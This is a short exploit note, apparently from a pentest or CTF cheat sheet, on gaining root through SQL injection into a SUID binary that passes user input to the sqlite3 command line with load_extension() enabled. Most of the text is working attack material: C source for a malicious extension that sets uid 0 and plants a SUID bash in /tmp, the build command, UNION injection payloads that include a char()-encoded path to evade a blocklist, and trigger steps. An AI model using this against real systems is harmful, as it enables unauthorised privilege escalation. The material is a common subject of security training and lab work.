# SQLite load_extension() RCE via SUID

If a root/SUID binary builds a raw `sqlite3` CLI query by string-formatting user input (common pattern: `sqlite3 db.sqlite3 -line 'UPDATE ... WHERE col="%s"'`) and `load_extension()` is enabled, a UNION injection into the query can load an attacker-supplied shared library — which runs its init function with the SUID binary's privileges:

```c
// exp.c — init function name must match "sqlite3_<libname>_init"
#include <stdlib.h>
#include <unistd.h>
void sqlite3_e_init() {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/bash && chmod +xs /tmp/bash");
}
```
```bash
gcc -g -fPIC -shared exp.c -o e.so
```
Inject via UNION; if `.`/`/` are blocklisted in the sanitizer, build the path from `char()` codes instead:
```sql
' UNION SELECT 1,load_extension('./e')--
' UNION SELECT 1,load_extension(char(46,47,101))--    -- same thing, dodges a literal './' block
```
Then run the SUID binary again to trigger the query, and `/tmp/bash -p` for a root shell.
